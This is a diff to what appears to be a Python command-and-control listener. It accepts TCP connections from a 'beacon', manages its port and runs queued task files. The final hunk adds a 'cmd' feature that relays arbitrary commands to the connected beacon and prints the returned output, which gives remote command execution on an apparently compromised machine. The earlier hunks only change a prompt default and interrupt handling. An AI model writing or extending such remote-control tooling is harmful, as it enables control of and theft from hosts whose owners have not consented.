@@ -235,11 +235,11 @@ def listen():
     bindsocket.bind((listen_addr, listen_port))
     bindsocket.listen(1)
     if listdir("tasks") != []:
-        ans = print_question("Found Pending Tasks, Run [y]/n")
-        if ans != "n":
-            run_tasks = True
-        else:
+        ans = print_question("Found Task Files, Run y/[n]")
+        if ans != "y":
             run_tasks = False
+        else:
+            run_tasks = True
     else:
         run_tasks = False
 
@@ -248,7 +248,10 @@ def listen():
             if run_tasks == True and VERBOSE is True:
                 print_info("Ready to Run a Task File")
             print_info("Listening for incoming TCP connection on {}:{}".format(listen_addr,listen_port))
-            newsocket, fromaddr = bindsocket.accept()
+            try:
+                newsocket, fromaddr = bindsocket.accept()
+            except KeyboardInterrupt:
+                raise KeyboardInterrupt
         except KeyboardInterrupt:
             print_warn("punt")
             exit()
@@ -380,7 +383,18 @@ def listen():
                         beacon.change_port(conn)
                     else:
                         cmd = ""
-                    
+                elif cmd.split()[0] == "cmd":
+                    data = ""
+                    send_data(conn, cmd.strip("cmd "))
+                    if VERBOSE:
+                        print_info("Waiting for data...")
+                    while not data.endswith('[END]'):
+                        recv = conn.recv(128)
+                        recv_decoded = recv.decode('utf-8')
+                        data = data + recv_decoded
+                    print(data.rstrip("[END]"))
+                    data = ""
+                    cmd = ""
                 else:
                     cmd = ""
 
